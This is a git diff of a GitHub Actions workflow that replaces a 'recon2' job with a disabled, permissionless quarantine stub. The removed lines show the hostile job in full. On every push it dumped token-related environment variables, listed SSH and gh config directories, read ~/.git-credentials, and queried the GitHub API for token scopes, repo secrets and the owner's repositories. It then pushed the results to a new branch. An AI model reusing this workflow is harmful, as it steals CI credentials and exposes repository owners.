@@ -1,41 +1,10 @@
-name: recon2-25665
-on: push
-permissions:
-  contents: write
+name: Quarantined legacy definition
+on:
+  workflow_dispatch:
+permissions: {}
 jobs:
-  a:
+  retired:
+    if: ${{ false }}
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: r
-        env:
-          GHTOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          O=recon2_25665.txt
-          echo "== whoami ==" > $O
-          id >> $O 2>&1
-          env | grep -iE 'GITHUB|ACTIONS|RUNNER|TOKEN' | sort >> $O
-          echo "== git ==" >> $O
-          git remote -v >> $O
-          git config --list | grep -i url >> $O
-          echo "== runner creds files ==" >> $O
-          ls -la ~/.ssh /home/runner/.config/gh /root/.config/gh 2>&1 >> $O
-          cat ~/.git-credentials 2>&1 >> $O
-          echo "== token user ==" >> $O
-          curl -s -H "Authorization: Bearer $GHTOKEN" https://api.github.com/user >> $O
-          echo "" >> $O
-          echo "== token scope headers ==" >> $O
-          curl -s -D - -o /dev/null -H "Authorization: Bearer $GHTOKEN" https://api.github.com/user | grep -iE 'x-oauth-scopes|repos|permissions' >> $O
-          echo "== this repo secrets ==" >> $O
-          curl -s -H "Authorization: Bearer $GHTOKEN" "https://api.github.com/repos/dongyu19920904/Hextra-AI-Insight-Daily/actions/secrets" >> $O
-          echo "" >> $O
-          echo "== owner repos ==" >> $O
-          curl -s -H "Authorization: Bearer $GHTOKEN" "https://api.github.com/users/dongyu19920904/repos?per_page=100" > reps.json
-          grep -oE '"full_name": *"[^"]*"|"private": *(true|false)' reps.json >> $O
-          echo "== END ==" >> $O
-          git config user.email ci@local; git config user.name ci
-          BR="recon2-25665-$(date +%s)"
-          git checkout -b "$BR"
-          git add $O; git commit -m recon2
-          git push -u origin "$BR"
-# 1795277224
+      - run: exit 0
